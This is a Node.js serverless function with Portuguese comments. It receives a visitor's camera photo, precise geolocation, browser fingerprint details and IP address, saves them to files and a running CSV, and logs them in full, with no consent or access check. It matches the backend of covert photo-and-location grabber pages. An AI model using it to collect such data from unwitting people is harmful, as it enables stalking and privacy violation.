const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

const UPLOAD_DIR = '/tmp/uploads';

// Garante que a pasta existe
if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

exports.handler = async (event, context) => {
    // ===== LOG DETALHADO DA REQUISIÇÃO =====
    console.log('📥 REQUISIÇÃO RECEBIDA');
    console.log('📋 Método:', event.httpMethod);
    console.log('📋 Headers:', JSON.stringify(event.headers, null, 2));
    
    // Apenas aceita POST
    if (event.httpMethod !== 'POST') {
        console.log('❌ Método não permitido:', event.httpMethod);
        return {
            statusCode: 405,
            body: JSON.stringify({ erro: 'Método não permitido' })
        };
    }

    try {
        // ===== LOG DO CORPO DA REQUISIÇÃO =====
        console.log('📦 CORPO DA REQUISIÇÃO (RAW):', event.body);
        
        const dados = JSON.parse(event.body);
        console.log('📦 DADOS PARSEADOS:', JSON.stringify(dados, null, 2));
        
        const id = uuidv4();
        const timestamp = Date.now();
        const dataHora = new Date().toISOString();

        console.log(`🆔 ID Gerado: ${id}`);
        console.log(`📅 Timestamp: ${dataHora}`);

        let fotoSalva = false;
        let nomeFoto = null;

        // ===== SALVA A FOTO =====
        if (dados.foto && dados.foto.startsWith('data:image')) {
            console.log('📸 Processando foto...');
            try {
                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
                nomeFoto = `foto_${id}_${timestamp}.${extensao}`;
                const fotoPath = path.join(UPLOAD_DIR, nomeFoto);
                fs.writeFileSync(fotoPath, base64Data, 'base64');
                fotoSalva = true;
                console.log(`✅ Foto salva: ${nomeFoto} (${Math.round(base64Data.length / 1024)}KB)`);
            } catch (err) {
                console.log(`❌ Erro ao salvar foto: ${err.message}`);
            }
        } else {
            console.log('⚠️ Nenhuma foto enviada ou formato inválido');
        }

        // ===== LOG DA LOCALIZAÇÃO =====
        if (dados.localizacao) {
            console.log('📍 LOCALIZAÇÃO:');
            console.log(`   Latitude: ${dados.localizacao.latitude}`);
            console.log(`   Longitude: ${dados.localizacao.longitude}`);
            console.log(`   Precisão: ${dados.localizacao.precisao}m`);
        } else {
            console.log('⚠️ Nenhuma localização enviada');
        }

        // ===== LOG DO NAVEGADOR =====
        if (dados.navegador) {
            console.log('🖥️ NAVEGADOR:');
            console.log(`   User-Agent: ${dados.navegador.userAgent}`);
            console.log(`   Timezone: ${dados.navegador.timezone}`);
            console.log(`   Idioma: ${dados.navegador.language}`);
        }

        // ===== SALVA OS DADOS EM JSON =====
        const dadosParaSalvar = {
            id,
            timestamp: dataHora,
            localizacao: dados.localizacao || null,
            navegador: dados.navegador || null,
            ip: event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'IP não disponível',
            foto: fotoSalva ? nomeFoto : null
        };

        const jsonPath = path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`);
        fs.writeFileSync(jsonPath, JSON.stringify(dadosParaSalvar, null, 2));
        console.log(`💾 Dados salvos em: ${jsonPath}`);

        // ===== SALVA NO CSV =====
        const csvPath = path.join(UPLOAD_DIR, 'todos_dados.csv');
        const csvExiste = fs.existsSync(csvPath);
        const csvLine = [
            dataHora,
            id,
            dados.localizacao?.latitude || 'N/A',
            dados.localizacao?.longitude || 'N/A',
            dados.localizacao?.precisao || 'N/A',
            dados.navegador?.userAgent || 'N/A',
            dados.navegador?.timezone || 'N/A',
            dados.navegador?.language || 'N/A',
            event.headers['x-forwarded-for'] || 'N/A',
            fotoSalva ? 'Sim' : 'Não'
        ].join(',');

        if (!csvExiste) {
            fs.writeFileSync(csvPath, 'Data,ID,Latitude,Longitude,Precisao,UserAgent,Timezone,Idioma,IP,Foto\n' + csvLine + '\n');
        } else {
            fs.appendFileSync(csvPath, csvLine + '\n');
        }
        console.log('📊 CSV atualizado com sucesso');

        // ===== RESPOSTA =====
        console.log('✅ COLETA FINALIZADA COM SUCESSO!');
        return {
            statusCode: 200,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({
                status: 'success',
                id: id,
                fotoSalva: fotoSalva,
                timestamp: dataHora
            })
        };

    } catch (error) {
        console.error('💥 ERRO CRÍTICO:', error);
        console.error('📚 Stack:', error.stack);
        return {
            statusCode: 500,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({
                status: 'error',
                mensagem: error.message
            })
        };
    }
};
